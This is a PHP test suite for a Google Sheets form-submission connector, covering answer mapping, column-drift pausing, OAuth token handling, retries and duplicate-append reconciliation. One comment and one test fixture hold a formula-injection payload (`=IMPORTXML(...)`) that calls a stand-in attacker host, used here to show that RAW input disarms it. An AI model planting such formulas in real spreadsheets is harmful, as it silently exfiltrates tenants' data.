<?php

declare(strict_types=1);

use App\Enums\ConnectionStatus;
use App\Enums\ConnectorSubscriptionStatus;
use App\Enums\SubmissionStatus;
use App\Enums\WebhookDeliveryStatus;
use App\Jobs\Connectors\DeliverConnectorMessageJob;
use App\Models\Connection;
use App\Models\ConnectionSubscription;
use App\Models\Tenant;
use App\Models\User;
use App\Models\WebhookDelivery;
use App\Notifications\Connectors\ConnectionRevokedNotification;
use App\Notifications\Connectors\ConnectorRulePausedNotification;
use App\Support\Mapping\ColumnMapping;
use App\Support\Tenancy\TenantContext;
use Database\Seeders\RolePermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Notification;
use Spatie\Permission\PermissionRegistrar;

uses(RefreshDatabase::class);

/*
|--------------------------------------------------------------------------
| H16a — the Google Sheets channel end to end, on ConnectorDeliveryJobTest's committing-job recipe
| (workOneJob + Http::fake, sharing the test PDO so the fake and the uncommitted rows are both visible).
|
| What is worth pinning here is everything Slack has no equivalent for:
|   • a row carries ANSWERS, which no other channel sends, projected through a stored ColumnMapping;
|   • formulas are disarmed by valueInputOption=RAW, and the append cannot overwrite the tenant's own data;
|   • column drift PAUSES ONE RULE and leaves the connection and its other rules alive;
|   • a 401 is NOT a dead grant, because Google answers 401 for an expired token too.
*/

beforeEach(function (): void {
    TenantContext::flush();
    config()->set('queue.default', 'database');
    config()->set('connectors.providers.google_sheets.client_id', 'client-abc');
    config()->set('connectors.providers.google_sheets.client_secret', 'secret-xyz');
    Http::preventStrayRequests();

    $this->seed(RolePermissionSeeder::class);

    $this->owner = User::factory()->create(['email' => 'owner@acme.test']);
    $this->tenant = Tenant::create([
        'name' => 'Acme',
        'slug' => 'acme',
        'default_locale' => 'en',
        'owner_user_id' => $this->owner->id,
    ]);
    $this->tenant->domains()->create(['domain' => 'acme']);
    enterTenant($this->tenant->id, $this->owner->id);
    // The owner must be an ACTIVE MEMBER for their users row to resolve under the job's tenant RLS — without
    // this an owner-notification assertion fails silently rather than loudly (the H15a recipe).
    makeActiveMember($this->owner, 'owner');

    $this->form = publishedInboxForm($this->tenant, $this->owner, 'Intake');
    enterTenant($this->tenant->id);
});

afterEach(function (): void {
    app(PermissionRegistrar::class)->setPermissionsTeamId(null);
});

/** The rule's stored mapping: three of the form's own fields, plus one column the tenant keeps for itself. */
function sheetsMapping(array $headers = ['Full name', 'Colour', 'Reviewer notes', 'Submission ID']): ColumnMapping
{
    return ColumnMapping::author($headers, [
        'Full name' => 'full_name',
        'Colour' => 'color',
        'Submission ID' => '__submission_id',
    ]);
}

function sheetsConfig(?ColumnMapping $mapping = null, array $overrides = []): array
{
    return array_merge([
        'spreadsheet_id' => 'SHEET123',
        'sheet_name' => 'Responses',
        'mapping' => ($mapping ?? sheetsMapping())->toArray(),
    ], $overrides);
}

/** Fake the header-row READ and the append WRITE independently, so each can be asserted or failed alone. */
function fakeSheets(array $headerRow = ['Full name', 'Colour', 'Reviewer notes', 'Submission ID'], ?callable $appendResponse = null): void
{
    Http::fake([
        'sheets.googleapis.com/v4/spreadsheets/*/values/*:append*' => $appendResponse ?? Http::response(['updates' => ['updatedRows' => 1]], 200),
        'sheets.googleapis.com/v4/spreadsheets/*/values/*' => Http::response(['values' => [$headerRow]], 200),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.refreshed', 'expires_in' => 3600], 200),
    ]);
}

/**
 * Seed a submission, a Google grant + rule pointed at it, and run one delivery attempt.
 *
 * @return array{0: Connection, 1: ConnectionSubscription, 2: WebhookDelivery}
 */
function runSheetsDelivery(array $connectionAttrs = [], array $config = [], array $envelopeData = []): array
{
    /** @var Tenant $tenant */
    $tenant = test()->tenant;

    $submission = seedInboxSubmission(test()->form, test()->owner, SubmissionStatus::Submitted, [
        'full_name' => 'Ana Reyes',
        'color' => 'b',
    ]);

    $connection = Connection::factory()->googleSheets()->create($connectionAttrs);
    $subscription = ConnectionSubscription::factory()->forConnection($connection)->create([
        'config' => $config === [] ? sheetsConfig() : $config,
    ]);
    $delivery = WebhookDelivery::factory()->forSubscription($subscription)->create([
        'payload' => [
            'event_type' => 'submission.created',
            'occurred_at' => '2026-08-05T09:00:00Z',
            'data' => array_merge(['submission_id' => (string) $submission->id, 'form_id' => (string) test()->form->id], $envelopeData),
        ],
    ]);

    DeliverConnectorMessageJob::dispatch($tenant->id, (string) $delivery->id);
    workOneJob('webhooks');

    enterTenant($tenant->id);

    return [$connection->fresh(), $subscription->fresh(), $delivery->fresh()];
}

/** The JSON body of the append call, or null if none was made. */
function appendedRow(): ?array
{
    $row = null;

    Http::recorded(function (Request $request) use (&$row): bool {
        if (str_contains($request->url(), ':append')) {
            $row = $request->data()['values'][0] ?? null;
        }

        return true;
    });

    return $row;
}

// ── The happy path ──────────────────────────────────────────────────────────────────────────────────────

it('appends the submission\'s ANSWERS in the mapping\'s column order', function (): void {
    // No other channel in this repo sends answer content: the DomainEvent envelope is metadata-only by
    // design. This is the whole reason the adapter resolves the submission at delivery time.
    fakeSheets();

    [, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded)
        ->and($delivery->attempt_count)->toBe(1)
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);

    $row = appendedRow();

    expect($row)->toHaveCount(4)
        ->and($row[0])->toBe('Ana Reyes')
        // The choice LABEL, not the stored value 'b' — resolved through the same SchemaValueFormatter the
        // CSV export uses, which is what the SubmissionRowProjector extraction bought.
        ->and($row[1])->toBe('Blue')
        // The tenant's own unmapped column: an empty cell, never a skipped one, or every column after it
        // would shift left by one.
        ->and($row[2])->toBe('')
        ->and($row[3])->not->toBe('');
});

it('disarms formulas with valueInputOption=RAW and never overwrites data below the table', function (): void {
    // security-threat-model.md §5's formula-injection row, in its Google form. Under USER_ENTERED an answer
    // beginning `=` is evaluated by GOOGLE'S servers on arrival — `=IMPORTXML("https://attacker…")` exfiltrates
    // the row with no human ever opening the file, which is strictly worse than the CSV case that row names.
    //
    // insertDataOption is the other half and is easy to miss: the API DEFAULTS to OVERWRITE, which writes over
    // whatever sits below the detected table — a totals block, the tenant's notes.
    fakeSheets();

    runSheetsDelivery();

    Http::assertSent(function (Request $request): bool {
        if (! str_contains($request->url(), ':append')) {
            return false;
        }

        parse_str((string) parse_url($request->url(), PHP_URL_QUERY), $query);

        return ($query['valueInputOption'] ?? null) === 'RAW'
            && ($query['insertDataOption'] ?? null) === 'INSERT_ROWS';
    });
});

it('sends a formula-shaped answer through as an inert string', function (): void {
    fakeSheets();

    seedInboxSubmission(test()->form, test()->owner, SubmissionStatus::Submitted, ['full_name' => '=IMPORTXML("https://evil.example","//x")']);

    [, , $delivery] = runSheetsDelivery();

    // The payload is unescaped on purpose — RAW is the control, not a prefix or a quote. Asserting the value
    // arrives VERBATIM is what proves we are relying on the transport flag rather than mangling tenant data.
    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded);
});

// ── Drift: the decision this increment was chosen for ───────────────────────────────────────────────────

it('refuses to write, pauses ONLY that rule, and tells the owner once when the columns move', function (): void {
    Notification::fake();

    // Same labels, different order — the change a "which columns exist?" check cannot see, and the one that
    // would put every answer under the wrong heading.
    fakeSheets(['Full name', 'Reviewer notes', 'Colour', 'Submission ID']);

    [$connection, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::DeadLettered)
        ->and($delivery->next_retry_at)->toBeNull()
        ->and($delivery->response_body_excerpt)->toContain('moved')
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused)
        // The GRANT is untouched: it is the destination that changed, not the credential. Revoking here would
        // take down every other rule on the connection over one spreadsheet edit.
        ->and($connection->status)->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->not->toBe('');

    Notification::assertSentOnDemand(ConnectorRulePausedNotification::class);
    Notification::assertNotSentTo(Notification::route('mail', 'owner@acme.test'), ConnectionRevokedNotification::class);

    // Nothing was written. Asserting the absence is the point — a drift that still appended would be the
    // silent misalignment the whole engine exists to prevent.
    expect(appendedRow())->toBeNull();
});

it('does not re-notify the owner for every queued delivery against a drifted sheet', function (): void {
    // A busy form has several submissions already enqueued when the tenant edits their sheet, so "notify once"
    // has to survive the SECOND delivery, not just the first.
    //
    // This test drives two deliveries deliberately. Written with one, it passed under both the real code and a
    // mutation that removed the guard entirely — the vacuous shape the H21c/H24a lessons warn about, and it is
    // how the `! $alreadyPaused` flag was found to be dead code. What actually holds the property is the job's
    // own Active-status precondition: the first block pauses the rule and everything queued behind it stops
    // before it can send anything.
    Notification::fake();
    fakeSheets(['Full name', 'Colour']);

    [, $subscription] = runSheetsDelivery();
    expect($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused);

    // A second delivery for the SAME now-paused rule.
    $second = WebhookDelivery::factory()->forSubscription($subscription)->create([
        'payload' => ['event_type' => 'submission.created', 'occurred_at' => '2026-08-05T09:01:00Z', 'data' => ['submission_id' => '0198-x']],
    ]);
    DeliverConnectorMessageJob::dispatch($this->tenant->id, (string) $second->id);
    workOneJob('webhooks');
    enterTenant($this->tenant->id);

    Notification::assertSentOnDemandTimes(ConnectorRulePausedNotification::class, 1);
});

it('accepts a header row that differs only cosmetically', function (): void {
    // The normalizer earning its keep at the level the delivery path actually calls: a capitalisation edit or
    // a stray trailing space must not pause a tenant's rule.
    fakeSheets(['  full name', 'COLOUR', 'Reviewer  notes', 'Submission ID ', '']);

    [, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded)
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);
});

// ── Token expiry vs a dead grant — the classification trap ──────────────────────────────────────────────

it('hands an expired token to its own refresh job and delivers on the next attempt', function (): void {
    // ADR-0009 §D6's revisit trigger, fired in H16a: Google's tokens live ~1h against an hourly sweep, so a
    // grant can be dead on arrival through no fault of the sweep. That reasoning is unchanged.
    //
    // ⚠️ WHAT CHANGED IN M6 IS WHERE THE ROTATION HAPPENS, NOT WHETHER IT DOES. Performing it here put an
    // IRREVERSIBLE provider-side effect inside this job's transaction, with three more outbound calls after
    // it — so any later throw, or the 60s `$timeout`, rolled our token write back while the provider stayed
    // rotated. On Airtable, which invalidates the previous refresh token on every renewal, the next sweep
    // then got `invalid_grant` and killed the whole connection. The delivery now DEFERS one ladder step and
    // arrives with a token that is real.
    fakeSheets();

    [$connection, , $delivery] = runSheetsDelivery(['token_expires_at' => Carbon::now()->subMinute()]);

    // Nothing was sent to Google by THIS attempt — not the token endpoint, not the sheet.
    Http::assertNothingSent();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->next_retry_at)->not->toBeNull()
        ->and($delivery->response_body_excerpt)->toContain('[token_refreshing]')
        ->and($connection->status)->toBe(ConnectionStatus::Active);

    // The refresh was handed off rather than dropped, and running it renews the grant.
    expect(DB::table('jobs')->count())->toBe(1);
    workOneJob('scheduled-maintenance');
    enterTenant(test()->tenant->id);

    expect($connection->fresh()->access_token)->toBe('ya29.refreshed');

    Http::assertSent(fn (Request $r): bool => str_contains($r->url(), 'oauth2.googleapis.com/token')
        && ($r->data()['grant_type'] ?? null) === 'refresh_token');
});

it('leaves a healthy token alone rather than refreshing on every send', function (): void {
    // The guard is a guard, not a second refresh policy. If this fired every time, one provider outage would
    // stampede every queued delivery — which is the cost ADR-0009 §D6 refused to pay.
    fakeSheets();

    runSheetsDelivery(['token_expires_at' => Carbon::now()->addHour()]);

    Http::assertNotSent(fn (Request $r): bool => str_contains($r->url(), 'oauth2.googleapis.com/token'));
});

it('treats a 401 as RETRYABLE, because Google answers 401 for an expired token too', function (): void {
    // THE trap. Google returns `authError` / "Invalid Credentials" for an expired access token AND a revoked
    // grant, so mapping 401 to credentialRejected would revoke a live connection roughly once an hour,
    // clearing both tokens and emailing the owner each time.
    Notification::fake();

    Http::fake([
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 401, 'status' => 'UNAUTHENTICATED', 'message' => 'Invalid Credentials']], 401),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.refreshed', 'expires_in' => 3600], 200),
    ]);

    [$connection, $subscription, $delivery] = runSheetsDelivery(['token_expires_at' => Carbon::now()->addHour()]);

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->next_retry_at)->not->toBeNull()
        ->and($connection->status)->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->not->toBe('')
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);

    Notification::assertNothingSent();
});

it('DOES kill the grant when the token endpoint says invalid_grant', function (): void {
    // The other side of the same coin: the token endpoint is the only place the difference is observable, so
    // this is where terminal actually means terminal.
    Notification::fake();

    Http::fake([
        'oauth2.googleapis.com/token' => Http::response(['error' => 'invalid_grant'], 400),
        'sheets.googleapis.com/*' => Http::response(['values' => [[]]], 200),
    ]);

    [$connection, , $delivery] = runSheetsDelivery(['token_expires_at' => Carbon::now()->subMinute()]);

    // ⚠️ M6 SPLIT THIS ACROSS TWO JOBS, AND THE REFUSAL NOW BELONGS TO THE ONE THAT ASKED. The delivery
    // defers; the refresh job makes the call, is told `invalid_grant`, and marks the grant dead — which is
    // the whole reason the rotation was moved somewhere it cannot be rolled back.
    expect($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($connection->status)->toBe(ConnectionStatus::Active);

    workOneJob('scheduled-maintenance');
    enterTenant(test()->tenant->id);

    $connection->refresh();

    expect($connection->status)->not->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->toBe('');

    Notification::assertSentOnDemand(ConnectionRevokedNotification::class);

    // And the delivery is settled rather than left to be re-swept forever: the next attempt finds a dead
    // grant and dead-letters it with our own copy.
    DeliverConnectorMessageJob::dispatch(test()->tenant->id, (string) $delivery->id);
    workOneJob('webhooks');
    enterTenant(test()->tenant->id);

    expect($delivery->fresh()->status)->toBe(WebhookDeliveryStatus::DeadLettered)
        ->and($delivery->fresh()->response_body_excerpt)->toContain('[grant_expired]');
});

it('does NOT kill the grant when the token endpoint merely times out', function (): void {
    // The defect the unused-constant PHPStan finding exposed: ConnectionTokenRefresher marked a grant dead on
    // ANY ConnectorOAuthException, so one blip at Google's token endpoint would clear both tokens, pause every
    // rule and require a human to re-run OAuth. Unreachable in H15a (Slack tokens never expire); reachable on
    // every Google send from H16a on.
    Notification::fake();

    // The realistic shape: the refresh times out, so the send goes out with the stale token and Google
    // answers 401. The delivery must land on the RETRY LADDER with the grant intact — one blip costs a few
    // minutes, not the tenant's integration.
    Http::fake([
        'oauth2.googleapis.com/token' => fn () => throw new ConnectionException('timeout'),
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 401, 'status' => 'UNAUTHENTICATED']], 401),
    ]);

    [$connection, $subscription, $delivery] = runSheetsDelivery(['token_expires_at' => Carbon::now()->subMinute()]);

    expect($connection->status)->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->not->toBe('')
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->next_retry_at)->not->toBeNull()
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);

    Notification::assertNotSentTo(Notification::route('mail', 'owner@acme.test'), ConnectionRevokedNotification::class);
});

// ── Destination-level refusals ──────────────────────────────────────────────────────────────────────────

it('blocks rather than retries when the spreadsheet cannot be reached', function (): void {
    // 404 and 403 are rule-level and human-fixable — under `drive.file` a 403 is the ordinary "you own that
    // sheet but never picked it through us" case. Neither improves by being retried for seven days.
    Notification::fake();
    Http::fake([
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 404, 'status' => 'NOT_FOUND']], 404),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.x', 'expires_in' => 3600], 200),
    ]);

    [$connection, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::DeadLettered)
        ->and($delivery->next_retry_at)->toBeNull()
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused)
        ->and($connection->status)->toBe(ConnectionStatus::Active);
});

it('retries a rate limit instead of blocking on it', function (): void {
    // A 403 is not automatically a permission problem: Google reuses it for quota. Blocking here would pause a
    // healthy rule because the tenant had a busy afternoon.
    Http::fake([
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 403, 'status' => 'PERMISSION_DENIED', 'errors' => [['reason' => 'rateLimitExceeded']]]], 403),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.x', 'expires_in' => 3600], 200),
    ]);

    [, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->next_retry_at)->not->toBeNull()
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);
});

it('quotes a tab name with spaces, which is Google\'s OWN default for a form-linked sheet', function (): void {
    // "Form Responses 1" is the tab Google creates automatically. Unquoted, `Form Responses 1!1:1` is not
    // parseable A1 notation, so the connector would fail on an entirely ordinary destination — and fail as a
    // 400, i.e. as a retry, spending the whole ladder to reach a dead letter with no explanation.
    fakeSheets();

    [, , $delivery] = runSheetsDelivery(config: sheetsConfig(null, ['sheet_name' => 'Form Responses 1']));

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded);

    Http::assertSent(function (Request $request): bool {
        // Both the header READ and the append WRITE must quote it, so assert on whichever this call is.
        $url = rawurldecode($request->url());

        return str_contains($url, "'Form Responses 1'");
    });
});

it('escapes an apostrophe in a tab name by doubling it, per A1\'s own rule', function (): void {
    fakeSheets();

    [, , $delivery] = runSheetsDelivery(config: sheetsConfig(null, ['sheet_name' => "Ana's data"]));

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded);

    Http::assertSent(fn (Request $r): bool => str_contains(rawurldecode($r->url()), "'Ana''s data'"));
});

it('blocks rather than retries when the tab has been renamed or deleted', function (): void {
    // Google answers 400 INVALID_ARGUMENT for a range it cannot resolve, which includes a tab that no longer
    // exists — the most likely way a working rule breaks after setup, and permanent until a human fixes it.
    Http::fake([
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 400, 'status' => 'INVALID_ARGUMENT', 'message' => 'Unable to parse range']], 400),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.x', 'expires_in' => 3600], 200),
    ]);

    [$connection, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::DeadLettered)
        ->and($delivery->next_retry_at)->toBeNull()
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused)
        ->and($connection->status)->toBe(ConnectionStatus::Active);
});

it('blocks a rule whose event carries no submission to write', function (): void {
    fakeSheets();

    [, $subscription, $delivery] = runSheetsDelivery(config: sheetsConfig(), envelopeData: ['submission_id' => null]);

    expect($delivery->status)->toBe(WebhookDeliveryStatus::DeadLettered)
        ->and($delivery->response_body_excerpt)->toContain('unsupported_event')
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused);
});

// ── M5 — the append is non-idempotent, so an unconfirmed one is never re-driven blind ────────────────────
//
// The twin of the Airtable block, and deliberately the same seven cases: the two adapters share a mapping
// engine, a ledger and a retry ladder, so a property that holds for one and not the other is a defect
// wearing a coincidence. Reproduced the same way before it was fixed -- driven against the unfixed adapter
// the reconciliation case appends TWICE for one submission and never reads anything back.
//
// ⚠️ TWO FIXTURE HAZARDS, BOTH LIVE HERE TOO.
// (1) `Http::fake()` INVOKES EVERY STUB FOR EVERY REQUEST and keeps the first non-null answer, so the
//     values stub below must DECLINE the `:append` URL explicitly or it counts the writes as probes.
// (2) The header-row read and the reconciliation read share one URL shape (`.../values/<range>`); they are
//     told apart by the range itself, `!1:1` versus the identity column's `!D:D`.

/**
 * A Sheets stub whose appends are SCRIPTED per attempt, with the reconciliation read answered separately.
 *
 * @param  list<mixed>  $appendAnswers  one per append, in order: a Response, or a callable to throw from
 * @param  callable|null  $probeAnswer  the answer to a reconciliation read (default: the row is present)
 */
function scriptedSheets(
    array $appendAnswers,
    ?callable $probeAnswer = null,
    array $headerRow = ['Full name', 'Colour', 'Reviewer notes', 'Submission ID'],
): callable {
    $writes = 0;
    $probes = 0;

    Http::fake([
        'sheets.googleapis.com/v4/spreadsheets/*/values/*:append*' => function () use (&$writes, $appendAnswers) {
            $answer = $appendAnswers[$writes] ?? Http::response(['updates' => ['updatedRows' => 1]], 200);
            $writes++;

            return is_callable($answer) ? $answer() : $answer;
        },
        'sheets.googleapis.com/v4/spreadsheets/*/values/*' => function (Request $request) use (&$probes, $probeAnswer, $headerRow) {
            // See hazard (1): this stub is called for the append too, and must decline it.
            if (str_contains($request->url(), ':append')) {
                return null;
            }

            // See hazard (2): `!1:1` is the header row every delivery reads before it writes.
            if (str_contains($request->url(), rawurlencode('!1:1'))) {
                return Http::response(['values' => [$headerRow]], 200);
            }

            $probes++;

            return $probeAnswer === null
                ? Http::response(['values' => [[test()->m5SubmissionId]]], 200)
                : $probeAnswer();
        },
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.refreshed', 'expires_in' => 3600], 200),
    ]);

    // BY REFERENCE, and this is not a style choice: an arrow function captures by VALUE at the moment it
    // is created, so `fn () => ['writes' => $writes]` would answer 0 forever and every count below would be a
    // property of the closure rather than of the run.
    return function () use (&$writes, &$probes): array {
        return ['writes' => $writes, 'probes' => $probes];
    };
}

/**
 * Seed a Google grant, rule and pending delivery WITHOUT running it, so a case can drive several attempts.
 *
 * The submission id is stashed on the test instance because `scriptedSheets()` has to be able to answer a
 * reconciliation read with the very value the adapter will look for — a probe fixture that answered with
 * some other id would make every "already present" case pass for the wrong reason.
 *
 * @return array{0: ConnectionSubscription, 1: WebhookDelivery}
 */
function seedSheetsDelivery(?ColumnMapping $mapping = null): array
{
    $submission = seedInboxSubmission(test()->form, test()->owner, SubmissionStatus::Submitted, [
        'full_name' => 'Ana Reyes',
        'color' => 'b',
    ]);

    test()->m5SubmissionId = (string) $submission->id;

    $connection = Connection::factory()->googleSheets()->create();
    $subscription = ConnectionSubscription::factory()->forConnection($connection)->create([
        'config' => sheetsConfig($mapping),
    ]);
    $delivery = WebhookDelivery::factory()->forSubscription($subscription)->create([
        'payload' => [
            'event_type' => 'submission.created',
            'occurred_at' => '2026-08-19T09:00:00Z',
            'data' => ['submission_id' => (string) $submission->id, 'form_id' => (string) test()->form->id],
        ],
    ]);

    return [$subscription, $delivery];
}

/** One more attempt on an existing delivery — exactly what `WebhookRetrySweeper::sweep()` re-dispatches. */
function attemptSheetsDelivery(WebhookDelivery $delivery): WebhookDelivery
{
    /** @var Tenant $tenant */
    $tenant = test()->tenant;

    DeliverConnectorMessageJob::dispatch($tenant->id, (string) $delivery->id);
    workOneJob('webhooks');

    enterTenant($tenant->id);

    return $delivery->fresh();
}

it('records an append whose answer was lost as UNCONFIRMED, not merely failed', function (): void {
    $counts = scriptedSheets([fn () => throw new ConnectionException('cURL error 28: Operation timed out')]);

    [, $delivery] = seedSheetsDelivery();
    $delivery = attemptSheetsDelivery($delivery);

    // THE CONTROL: the header read succeeded and the append was genuinely issued, so the outcome under test
    // is the WRITE's lost answer and not some earlier refusal that never reached Google at all.
    expect($counts()['writes'])->toBe(1)
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->next_retry_at)->not->toBeNull()
        ->and($delivery->unconfirmed_write_at)->not->toBeNull();
});

it('does NOT call an append unconfirmed when Google answered with a status', function (): void {
    // The control that the flag is not simply "the attempt failed". A 503 is a RESPONSE: Google answered
    // rather than silently committing the row, so the ladder may re-drive it with no probe.
    scriptedSheets([Http::response(['error' => ['code' => 503, 'status' => 'UNAVAILABLE']], 503)]);

    [, $delivery] = seedSheetsDelivery();
    $delivery = attemptSheetsDelivery($delivery);

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->unconfirmed_write_at)->toBeNull();
});

it('clears the unconfirmed mark once a later append gets a real answer', function (): void {
    // The flag has to describe the IMMEDIATELY PRECEDING attempt. A stale one would let a third attempt skip
    // a write that the second attempt never made.
    scriptedSheets([
        fn () => throw new ConnectionException('timeout'),
        Http::response(['error' => ['code' => 503, 'status' => 'UNAVAILABLE']], 503),
    ], probeAnswer: fn () => Http::response(['values' => [[]]], 200));

    [, $delivery] = seedSheetsDelivery();
    $delivery = attemptSheetsDelivery($delivery);

    expect($delivery->unconfirmed_write_at)->not->toBeNull();

    $delivery = attemptSheetsDelivery($delivery);

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->unconfirmed_write_at)->toBeNull();
});

it('reconciles instead of appending a second row when the first attempt may have landed', function (): void {
    $counts = scriptedSheets([fn () => throw new ConnectionException('timeout')]);

    [, $delivery] = seedSheetsDelivery();
    $delivery = attemptSheetsDelivery($delivery);
    $delivery = attemptSheetsDelivery($delivery);

    expect($counts())->toBe(['writes' => 1, 'probes' => 1])
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded)
        ->and($delivery->response_body_excerpt)->toBe('ok (already present)')
        ->and($delivery->unconfirmed_write_at)->toBeNull();

    // And it read ONE COLUMN, quoted for A1, rather than the sheet: the identity column is the fourth, so
    // `D:D`. A whole-grid read would carry the tenant's answer content back out of Google for no reason.
    Http::assertSent(fn (Request $request): bool => $request->method() === 'GET'
        && str_contains($request->url(), rawurlencode("'Responses'!D:D")));
});

it('appends exactly once more when the reconciliation proves the row is absent', function (): void {
    $counts = scriptedSheets(
        [fn () => throw new ConnectionException('timeout'), Http::response(['updates' => ['updatedRows' => 1]], 200)],
        probeAnswer: fn () => Http::response(['values' => [[]]], 200),
    );

    [, $delivery] = seedSheetsDelivery();
    $delivery = attemptSheetsDelivery($delivery);
    $delivery = attemptSheetsDelivery($delivery);

    // The other half of the trade, and the one that matters more: refusing to write when we cannot confirm
    // would turn every lost answer into a submission that never arrives, which nobody would ever notice.
    expect($counts())->toBe(['writes' => 2, 'probes' => 1])
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded)
        ->and($delivery->response_body_excerpt)->toBe('ok')
        ->and($delivery->unconfirmed_write_at)->toBeNull();
});

it('still duplicates when the rule maps no Submission ID column, and that residual is the row', function (): void {
    // ⛔ ASSERTED AS A PASSING TEST SO IT CANNOT BE MISTAKEN FOR COVERAGE. Nothing we append identifies the
    // submission unless the tenant bound that column, so there is nothing to search for and the append goes
    // ahead -- today's behaviour exactly. Matching the whole projected row instead was rejected: two
    // respondents giving identical answers is ordinary on a short form, and a false match is a lost row.
    $counts = scriptedSheets([fn () => throw new ConnectionException('timeout')]);

    [, $delivery] = seedSheetsDelivery(ColumnMapping::author(
        ['Full name', 'Colour', 'Reviewer notes', 'Submission ID'],
        ['Full name' => 'full_name', 'Colour' => 'color'],
    ));

    $delivery = attemptSheetsDelivery($delivery);

    // The mark is still recorded -- the write really was unconfirmed -- and the probe is simply unavailable.
    expect($delivery->unconfirmed_write_at)->not->toBeNull();

    $delivery = attemptSheetsDelivery($delivery);

    expect($counts())->toBe(['writes' => 2, 'probes' => 0])
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded);
});

it('retries the reconciliation rather than gambling on an append when the probe fails', function (): void {
    $counts = scriptedSheets(
        [fn () => throw new ConnectionException('timeout')],
        probeAnswer: fn () => Http::response(['error' => ['code' => 503, 'status' => 'UNAVAILABLE']], 503),
    );

    [, $delivery] = seedSheetsDelivery();
    $delivery = attemptSheetsDelivery($delivery);
    $delivery = attemptSheetsDelivery($delivery);

    // "The probe failed" says nothing about whether the row is there, and a blind append is the one move
    // that cannot be taken back -- so the ladder retries the QUESTION and the mark survives to ask it again.
    expect($counts())->toBe(['writes' => 1, 'probes' => 1])
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->response_body_excerpt)->toStartWith('[unconfirmed_write]')
        ->and($delivery->unconfirmed_write_at)->not->toBeNull();
});

it('addresses the identity column past Z, where spreadsheet lettering stops being base-26', function (): void {
    // ⚠️ A CLAIM VERIFIED IN A SCRATCH HARNESS IS NOT A CLAIM THE REPO HOLDS. `columnLetter()` is private and
    // every other case here maps a four-column sheet, so the only exercised answer is `D` -- and the ordinary
    // intdiv/modulo pair anyone would write returns `A@` at index 26 and `BA` at 27. Column lettering is
    // BIJECTIVE base-26: there is no zero digit. This drives index 26 through the real delivery path so the
    // off-by-one that hides until a tenant maps a 27-column sheet fails here instead.
    $headers = array_map(static fn (int $i): string => 'Col '.$i, range(1, 26));
    $headers[] = 'Submission ID';

    $counts = scriptedSheets([fn () => throw new ConnectionException('timeout')], headerRow: $headers);

    [, $delivery] = seedSheetsDelivery(ColumnMapping::author($headers, [
        'Col 1' => 'full_name',
        'Submission ID' => '__submission_id',
    ]));

    $delivery = attemptSheetsDelivery($delivery);
    $delivery = attemptSheetsDelivery($delivery);

    expect($counts())->toBe(['writes' => 1, 'probes' => 1])
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded);

    // The 27th column is `AA`, not `A@` and not `BA`.
    Http::assertSent(fn (Request $request): bool => $request->method() === 'GET'
        && str_contains($request->url(), rawurlencode("'Responses'!AA:AA")));
});
